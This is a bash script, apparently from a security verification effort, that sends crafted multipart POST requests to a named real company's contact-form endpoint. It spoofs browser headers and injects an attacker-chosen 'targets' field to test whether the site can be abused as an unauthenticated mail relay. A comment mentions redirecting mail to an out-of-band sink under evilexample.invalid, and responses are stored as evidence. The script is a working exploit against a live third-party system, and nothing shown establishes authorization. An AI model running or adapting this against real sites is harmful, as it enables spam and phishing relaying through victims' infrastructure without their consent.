#!/bin/bash
# Independent verifier: unauthenticated mail-relay test against POST /api/send
# Usage: ./send_v1.sh <label> <targets-value> <msg-marker>
# Only sends to the address the site itself hardcodes (info@infinitycapital.bh) UNLESS
# a second argument naming an OOB sink under evilexample.invalid is supplied.
LABEL="$1"
TARGETS="$2"
MSG="${3:-INDEPENDENT-VERIFICATION}"

B=/tmp/vbnd$$   # local boundary file
{
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="fname"\r\n\r\nVerifier\r\n'
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="lname"\r\n\r\nIndependentCheck\r\n'
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="areacode"\r\n\r\n+973\r\n'
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="tel"\r\n\r\n12345678\r\n'
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="cname"\r\n\r\nIndependentVerifier\r\n'
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="subject"\r\n\r\nRelay verification\r\n'
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="msg"\r\n\r\n%s\r\n' "$MSG"
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="check"\r\n\r\nbotfilled\r\n'
  printf -- '--VBND1\r\n'
  printf 'Content-Disposition: form-data; name="targets"\r\n\r\n%s\r\n' "$TARGETS"
  printf -- '--VBND1--\r\n'
} > "$B"

curl -sS -i -X POST "https://www.infinitycapital.bh/api/send" \
  -H "Content-Type: multipart/form-data; boundary=VBND1" \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Origin: https://www.infinitycapital.bh' \
  -H 'Referer: https://www.infinitycapital.bh/contact' \
  --data-binary "@$B" \
  -o "/work/evidence/resp_${LABEL}.txt" -w 'HTTP=%{http_code} BYTES=%{size_download} TIME=%{time_total}\n'

rm -f "$B"
echo "----- body of resp_${LABEL}.txt -----"
tail -c 400 "/work/evidence/resp_${LABEL}.txt"
echo
